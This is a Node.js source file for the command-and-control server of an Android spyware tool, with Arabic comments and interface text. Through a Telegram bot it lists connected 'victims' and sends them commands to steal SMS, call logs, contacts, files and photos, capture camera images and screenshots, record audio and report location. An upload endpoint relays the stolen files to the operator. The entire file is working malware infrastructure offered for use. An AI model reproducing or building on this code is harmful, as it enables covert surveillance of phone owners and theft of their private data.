const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data['token'], { 'polling': true });

// استخدام خريطة تربط كل مدير (ChatId) بالضحية الذي يتحكم به حالياً
const activeTargets = new Map();

const fullCommands = [
    ['📞 سجل المكالمات 📞', '💬 سحب الرسائل 💬'],
    ['📒 سحبجهات الاتصال 📒', '📂 عرض جميع الملفات 📂'],
    ['📸 كيمرا أمامية 📸', '📸 كيمرا خلفية 📸'],
    ['📺 لقطة شاشة 😎', '🎙 تسجيل صوت 🎙'],
    ['🎬 سحب جميع الصور 🎬', '📍 الموقع الجغرافي 📍'],
    ['✯ العودة إلى القائمة الرئيسية ✯']
];

app.get('/', (req, res) => {
    res.send('<h1 align="center">Server running successfully</h1>');
});

app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceModel = req.body.model;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>✯ تم رفع الملف من هاتف </b>\n\n• <b>Device Model : </b>${deviceModel}\n\nDEVELOPED BY : @name_dark`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: 'application/octet-stream'
    });
    res.send('Done');
});

io.on('connection', socket => {
    let deviceModel = (socket.handshake.headers.model || 'unknown') + '-' + io.engine.clientsCount;
    let androidVersion = socket.handshake.headers.version || 'no information';
    let clientIp = socket.handshake.headers.ip || 'no information';

    socket.model = deviceModel;
    socket.version = androidVersion;
    socket.ip = clientIp;

    let connectMsg = `<b>✯ جهاز متصل جديد </b>\n\n• <b>اسم الهاتف : </b>${deviceModel}\n• <b>إصدار أندرويد : </b>${androidVersion}\n• <b>ip : </b>${clientIp}\n\n`;
    bot.sendMessage(data.id, connectMsg, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMsg = `<b>✯ جهاز غير متصل </b>\n\n• <b>اسم الهاتف : </b>${deviceModel}\n`;
        bot.sendMessage(data.id, disconnectMsg, { parse_mode: 'HTML' });
    });
});

bot.on('message', msg => {
    let chatId = msg.chat.id;
    let text = msg.text;

    if (text === '/start') {
        activeTargets.delete(chatId);
        bot.sendMessage(chatId, `<b>✯ أهلاً بك في لوحة تحكم الضحايا </b>\n\n• البوت جاهز للسيطرة التامة...\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزة المتصلة ✯', '✯ قائمة التحكم ✯']
                ],
                resize_keyboard: true
            }
        });
    } else if (text === '✯ عدد الاجهزة المتصلة ✯') {
        let count = io.sockets.sockets.size;
        if (count === 0) {
            bot.sendMessage(chatId, '<b>✯ لا يوجد ضحية متصل حالياً </b>', { parse_mode: 'HTML' });
        } else {
            let listMsg = `<b>✯ عدد الضحايا المتصلين : </b>${count}\n\n`;
            let counter = 1;
            io.sockets.sockets.forEach((socketObj) => {
                listMsg += `• <b>${counter++} - </b><b>الهاتف:</b> ${socketObj.model}\n• <b>الإصدار:</b> ${socketObj.version}\n• <b>IP:</b> ${socketObj.ip}\n\n`;
            });
            bot.sendMessage(chatId, listMsg, { parse_mode: 'HTML' });
        }
    } else if (text === '✯ قائمة التحكم ✯') {
        let count = io.sockets.sockets.size;
        if (count === 0) {
            bot.sendMessage(chatId, '<b>✯ لا يوجد ضحية متصل حالياً للتحكم به </b>', { parse_mode: 'HTML' });
        } else {
            let deviceButtons = [];
            io.sockets.sockets.forEach((socketObj) => {
                deviceButtons.push([socketObj.model]);
            });
            deviceButtons.push(['✯ العودة إلى القائمة الرئيسية ✯']);
            bot.sendMessage(chatId, '<b>✯ حدد الجهاز الذي تريد السيطرة عليه والتحكم به:</b>', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceButtons,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    } else if (text === '✯ العودة إلى القائمة الرئيسية ✯') {
        activeTargets.delete(chatId);
        bot.sendMessage(chatId, '<b>✯ القائمة الرئيسية </b>', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ عدد الاجهزة المتصلة ✯', '✯ قائمة التحكم ✯']
                ],
                resize_keyboard: true
            }
        });
    } else {
        // التحقق هل النص المطابق هو اسم جهاز متصل
        let matchedSocketId = null;
        let matchedModel = null;
        io.sockets.sockets.forEach((socketObj, socketId) => {
            if (socketObj.model === text) {
                matchedSocketId = socketId;
                matchedModel = socketObj.model;
            }
        });

        if (matchedSocketId) {
            // حفظ الجهاز المرتبط بهذا المشرف
            activeTargets.set(chatId, matchedSocketId);
            bot.sendMessage(chatId, `<b>✯ تم اختيار الجهاز بنجاح: </b>${matchedModel}\n\n• اختر الأمر المطلوب تنفيذه:`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: fullCommands,
                    resize_keyboard: true
                }
            });
        } else {
            // تنفيذ الأوامر على الجهاز المحفوظ مسبقاً
            let targetSocketId = activeTargets.get(chatId);
            if (targetSocketId) {
                let actionCode = text;
                if (text.includes('سجل المكالمات')) actionCode = 'calls';
                else if (text.includes('سحب الرسائل')) actionCode = 'sms';
                else if (text.includes('جهات الاتصال')) actionCode = 'contacts';
                else if (text.includes('جميع الملفات')) actionCode = 'files';
                else if (text.includes('كيمرا أمامية')) actionCode = 'selfie-cam';
                else if (text.includes('كيمرا خلفية')) actionCode = 'main-camera';
                else if (text.includes('لقطة شاشة')) actionCode = 'screen';
                else if (text.includes('تسجيل صوت')) actionCode = 'mic';
                else if (text.includes('جميع الصور')) actionCode = 'photos';
                else if (text.includes('الموقع الجغرافي')) actionCode = 'location';

                io.to(targetSocketId).emit('request', {
                    request: actionCode
                });

                bot.sendMessage(chatId, `<b>✯ جاري تنفيذ الأمر (${text}) على الجهاز...</b>`, { parse_mode: 'HTML' });
            } else {
                bot.sendMessage(chatId, '<b>⚠️ يرجى الانتقال إلى "قائمة التحكم" واختيار الجهاز أولاً!</b>', { parse_mode: 'HTML' });
            }
        }
    }
});

setInterval(() => {
    io.sockets.sockets.forEach((socketObj, socketId) => {
        io.to(socketId).emit('ping', {});
    });
}, 5000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is listening on port ${PORT}`);
});
